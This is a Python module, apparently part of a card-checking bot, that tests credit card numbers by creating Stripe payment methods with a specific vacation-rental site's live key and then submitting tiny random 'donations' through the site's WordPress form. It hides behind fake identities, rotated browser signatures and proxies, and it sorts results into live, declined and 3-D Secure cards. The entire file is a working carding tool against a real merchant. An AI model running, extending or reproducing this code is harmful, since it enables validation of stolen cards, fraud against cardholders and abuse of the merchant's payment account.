# gatet.py - Boutique Vacation Rentals Stripe Gateway
# Compatible with bot.py (single string return)
# Fixed: proxies parameter added
# Fixed: No Faker dependency - uses built-in random

import requests
import json
import time
import random
import uuid

# ========== CLASSIFICATION KEYS ==========
success_keys = ["appreciate", "Payment Success", "redirect_to", "thank", "Thanks", "redirectUrl", "succeeded", "confirmation", "Successful!", "Successful", "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!", "donation", "complete", "Payment successful"]
ccn_keys = ["security code is incorrect", "INCORRECT_CVV", "card number is incorrect", "invalid", "Your card number is incorrect"]
declined_keys = ["cannot be processed", "CARD_DECLINED", "Your card was declined.", "generic_decline", "declined"]
cvv_keys = ["transaction_not_allowed", "Your card does not support this type of purchase", "do_not_honor", "CVC"]
insufficient_keys = ["insufficient", "INSUFFICIENT_FUNDS", "Insufficient Funds", "low funds"]
expired_keys = ["card has expired"]
otp_keys = ["Verifying", "action_required", "verifying", "call_next_method", "requires_source_action", "requires_action", "3d_secure", "authenticate"]

def classify_response(last):
    if not last:
        return "DEAD"
    last_lower = str(last).lower()
    if any(key.lower() in last_lower for key in success_keys):
        return "HIT"
    if any(key.lower() in last_lower for key in otp_keys):
        return "3DS"
    if any(key.lower() in last_lower for key in ccn_keys):
        return "CCN"
    if any(key.lower() in last_lower for key in cvv_keys):
        return "CVV"
    if any(key.lower() in last_lower for key in insufficient_keys):
        return "INSUFFICIENT"
    if any(key.lower() in last_lower for key in expired_keys):
        return "EXPIRED"
    if any(key.lower() in last_lower for key in declined_keys):
        return "DECLINED"
    return "DEAD"

# ========== HELPERS (NO FAKER) ==========
def gen_random_name():
    """Generate random name without Faker"""
    first_names = [
        "James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", 
        "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Joseph", "Jessica",
        "Thomas", "Sarah", "Charles", "Karen", "Christopher", "Nancy", "Daniel", "Lisa",
        "Matthew", "Betty", "Anthony", "Margaret", "Mark", "Sandra", "Donald", "Ashley",
        "Steven", "Kimberly", "Paul", "Emily", "Andrew", "Donna", "Joshua", "Michelle",
        "Kenneth", "Carol", "Kevin", "Amanda", "Brian", "Melissa", "George", "Deborah",
        "Timothy", "Stephanie", "Ronald", "Rebecca", "Edward", "Sharon", "Jason", "Laura",
        "Jeffrey", "Cynthia", "Ryan", "Kathleen", "Jacob", "Amy", "Gary", "Angela",
        "Nicholas", "Shirley", "Eric", "Anna", "Jonathan", "Ruth", "Stephen", "Emma",
        "Larry", "Virginia", "Justin", "Alice", "Scott", "Jacqueline", "Brandon", "Joyce",
        "Benjamin", "Martha", "Samuel", "Teresa", "Gregory", "Janet", "Alexander", "Helen",
        "Patrick", "Judy", "Frank", "Gloria", "Raymond", "Ann", "Jack", "Diane",
        "Dennis", "Katherine", "Jerry", "Frances", "Tyler", "Megan", "Aaron", "Robin",
        "Jose", "Lori", "Nathan", "Brenda", "Adam", "Evelyn", "Henry", "Alice",
        "Zachary", "Diana", "Tiffany", "Maria", "Peter", "Christina", "Cameron", "Laura"
    ]
    last_names = [
        "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
        "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas",
        "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White",
        "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young",
        "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores",
        "Green", "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell",
        "Carter", "Roberts", "Gomez", "Phillips", "Evans", "Turner", "Diaz", "Parker",
        "Cruz", "Edwards", "Collins", "Reyes", "Stewart", "Morris", "Murphy", "Cook",
        "Rogers", "Morgan", "Peterson", "Cooper", "Reed", "Bailey", "Bell", "Howard",
        "Ward", "Cox", "Diaz", "Richardson", "Wood", "Watson", "Brooks", "Bennett",
        "Gray", "James", "Reyes", "Cruz", "Hughes", "Price", "Myers", "Long",
        "Foster", "Sanders", "Ross", "Powell", "Sullivan", "Russell", "Ortiz", "Jenkins",
        "Perry", "Butler", "Barnes", "Fisher", "Henderson", "Coleman", "Simmons", "Patterson"
    ]
    return random.choice(first_names), random.choice(last_names)

def gen_random_email(first_name, last_name):
    domains = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com", "@protonmail.com", "@mail.com"]
    return f"{first_name.lower()}{random.randint(1000, 99999)}{random.choice(domains)}"

def gen_random_user_agent():
    chrome_version = random.randint(120, 137)
    firefox_version = random.randint(100, 130)
    safari_version = random.randint(14, 17)
    
    agents = [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{firefox_version}.0) Gecko/20100101 Firefox/{firefox_version}.0",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_version}.0 Safari/605.1.15",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36 Edg/{chrome_version}.0.0.0",
        f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Windows NT 10.0; rv:{firefox_version}.0) Gecko/20100101 Firefox/{firefox_version}.0",
    ]
    return random.choice(agents)

def gen_random_guid():
    return f"{uuid.uuid4()}{random.randint(10000, 99999)}"

def gen_random_phone():
    formats = [
        f"07{random.randint(10000000, 99999999)}",
        f"+1{random.randint(100,999)}{random.randint(100,999)}{random.randint(1000,9999)}",
        f"0{random.randint(100,999)}{random.randint(100,999)}{random.randint(1000,9999)}",
        f"{random.randint(100,999)}-{random.randint(100,999)}-{random.randint(1000,9999)}"
    ]
    return random.choice(formats)

def gen_random_amount():
    """Random amount between 0.50 and 1.50"""
    cents = random.randint(50, 150)
    return f"{cents // 100}.{cents % 100:02d}"

# ========== MAIN TELE FUNCTION ==========
def Tele(ccx: str, gate: str = "ch1", proxies: dict = None):
    """
    Check credit card - returns string: "message|amount|time"
    proxies: optional dict like {"http": "http://...", "https": "http://..."}
    """
    start_time = time.time()
    
    # Parse card
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) != 4:
        elapsed = round(time.time() - start_time, 1)
        return f"ERROR: Invalid format|0.00|{elapsed}"

    n, mm, yy, cvc = parts
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:4]

    # ===== RANDOM AMOUNT (0.50 - 1.50) =====
    charge_amount = gen_random_amount()

    # Generate fake info
    first_name, last_name = gen_random_name()
    email = gen_random_email(first_name, last_name)
    full_name = f"{first_name} {last_name}"
    phone = gen_random_phone()

    guid = gen_random_guid()
    muid = gen_random_guid()
    sid = gen_random_guid()
    client_session_id = gen_random_guid()
    wallet_config_id = str(uuid.uuid4())

    stripe_key = "pk_live_51ODCnuBD8XiDzI9igICxOfdXhUKRPtd7m4dnxVox4wgwab2pxtZ2uGmt2lZzQPHkWsM7U8QwYPEr1m31qVNTvuBf00ZcLWATAo"

    session = requests.Session()
    # ✅ PROXY FIX: Proxy dict ကို session ထဲထည့်ပေး
    if proxies:
        session.proxies.update(proxies)
        
    session.cookies.set('__stripe_mid', muid)
    session.cookies.set('__stripe_sid', sid)

    # ===== STEP 1: Create Payment Method =====
    url_stripe = "https://api.stripe.com/v1/payment_methods"
    stripe_data = (
        f'type=card'
        f'&card[number]={n}'
        f'&card[cvc]={cvc}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
        f'&guid={guid}'
        f'&muid={muid}'
        f'&sid={sid}'
        f'&pasted_fields=number'
        f'&payment_user_agent=stripe.js%2F39914d4bef%3B+stripe-js-v3%2F39914d4bef%3B+card-element'
        f'&referrer=https%3A%2F%2Fboutiquevacationrentals.cloud'
        f'&time_on_page={random.randint(10000, 90000)}'
        f'&client_attribution_metadata[client_session_id]={client_session_id}'
        f'&client_attribution_metadata[merchant_integration_source]=elements'
        f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
        f'&client_attribution_metadata[merchant_integration_version]=2017'
        f'&client_attribution_metadata[wallet_config_id]={wallet_config_id}'
        f'&key={stripe_key}'
    )
    headers_stripe = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': gen_random_user_agent(),
    }

    try:
        resp = session.post(url_stripe, headers=headers_stripe, data=stripe_data, timeout=30)
    except Exception as e:
        elapsed = round(time.time() - start_time, 1)
        return f"NETWORK_ERROR|{charge_amount}|{elapsed}"

    if resp.status_code != 200:
        try:
            err = resp.json().get('error', {})
            err_msg = err.get('message', resp.text[:200])
        except:
            err_msg = resp.text[:200]
        elapsed = round(time.time() - start_time, 1)

        err_lower = str(err_msg).lower()
        if 'number' in err_lower and ('incorrect' in err_lower or 'invalid' in err_lower):
            return f"Your card number is incorrect|{charge_amount}|{elapsed}"
        if 'cvc' in err_lower or 'cvv' in err_lower:
            return f"security code is incorrect|{charge_amount}|{elapsed}"
        if 'expired' in err_lower:
            return f"card has expired|{charge_amount}|{elapsed}"
        if 'insufficient' in err_lower:
            return f"insufficient funds|{charge_amount}|{elapsed}"
        if 'declined' in err_lower:
            return f"Your card was declined.|{charge_amount}|{elapsed}"
        if '3d' in err_lower or 'authentication' in err_lower:
            return f"3D Secure authentication required|{charge_amount}|{elapsed}"
        return f"STRIPE_ERROR: {err_msg[:80]}|{charge_amount}|{elapsed}"

    try:
        resp_json = resp.json()
        if 'id' not in resp_json:
            elapsed = round(time.time() - start_time, 1)
            return f"STRIPE_ERROR: No payment method|{charge_amount}|{elapsed}"
        payment_method_id = resp_json['id']
    except:
        elapsed = round(time.time() - start_time, 1)
        return f"JSON_PARSE_ERROR|{charge_amount}|{elapsed}"

    # ===== STEP 2: Fluent Forms Submit =====
    url_wp = "https://boutiquevacationrentals.cloud/wp-admin/admin-ajax.php"
    datetime_now = f"{random.randint(1,28)}/{random.randint(1,12)}/{random.randint(2026,2027)}"
    datetime_future = f"{random.randint(1,28)}/{random.randint(1,12)}/{random.randint(2026,2027)}"
    numeric = random.randint(1000,9999)

    wp_data = (
        f'data=__fluent_form_embded_post_id%3D2858'
        f'%26_fluentform_3_fluentformnonce%3Dd625de3bed'
        f'%26_wp_http_referer%3D%252Fpayments%252F'
        f'%26names%255Bfirst_name%255D%3D{first_name}'
        f'%26names%255Blast_name%255D%3D{last_name}'
        f'%26email%3D{email}'
        f'%26phone%3D{phone}'
        f'%26input_text%3D'
        f'%26datetime%3D{datetime_now.replace("/", "%252F")}'
        f'%26datetime_1%3D{datetime_future.replace("/", "%252F")}'
        f'%26numeric_field%3D{numeric}'
        f'%26custom-payment-amount%3D{charge_amount}'
        f'%26payment_method%3Dstripe'
        f'%26__stripe_payment_method_id%3D{payment_method_id}'
        f'&action=fluentform_submit'
        f'&form_id=3'
    )

    headers_wp = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://boutiquevacationrentals.cloud',
        'Referer': 'https://boutiquevacationrentals.cloud/payments/',
        'User-Agent': gen_random_user_agent(),
        'X-Requested-With': 'XMLHttpRequest',
    }

    try:
        r2 = session.post(url_wp, data=wp_data, headers=headers_wp, timeout=30)
    except Exception as e:
        elapsed = round(time.time() - start_time, 1)
        return f"NETWORK_ERROR|{charge_amount}|{elapsed}"

    elapsed = round(time.time() - start_time, 1)

    try:
        resp_json = r2.json()

        if resp_json.get('success') == True:
            return f"Thank you for your donation!|{charge_amount}|{elapsed}"

        if 'data' in resp_json and 'errors' in resp_json['data']:
            errors = resp_json['data']['errors']
            error_text = " ".join([msg for msgs in errors.values() for msg in msgs])
            status = classify_response(error_text)

            if status == "HIT":
                return f"Thank you for your donation!|{charge_amount}|{elapsed}"
            elif status == "CCN":
                return f"security code is incorrect|{charge_amount}|{elapsed}"
            elif status == "CVV":
                return f"security code is incorrect|{charge_amount}|{elapsed}"
            elif status == "3DS":
                return f"3D Secure authentication required|{charge_amount}|{elapsed}"
            elif status == "INSUFFICIENT":
                return f"insufficient funds|{charge_amount}|{elapsed}"
            elif status == "EXPIRED":
                return f"card has expired|{charge_amount}|{elapsed}"
            elif status == "DECLINED":
                return f"Your card was declined.|{charge_amount}|{elapsed}"
            else:
                return f"DEAD - {error_text[:80]}|{charge_amount}|{elapsed}"

        message = resp_json.get('message', str(resp_json))
        status = classify_response(message)
        if status == "HIT":
            return f"Thank you for your donation!|{charge_amount}|{elapsed}"
        elif status == "CCN":
            return f"security code is incorrect|{charge_amount}|{elapsed}"
        elif status == "INSUFFICIENT":
            return f"insufficient funds|{charge_amount}|{elapsed}"
        else:
            return f"DEAD - {message[:80]}|{charge_amount}|{elapsed}"

    except json.JSONDecodeError:
        text = r2.text[:200]
        if "thank" in text.lower():
            return f"Thank you for your donation!|{charge_amount}|{elapsed}"
        else:
            return f"DEAD - {text[:80]}|{charge_amount}|{elapsed}"

# ========== TEST ==========
if __name__ == "__main__":
    test = "5344560017991222|10|29|900"
    print(Tele(test))
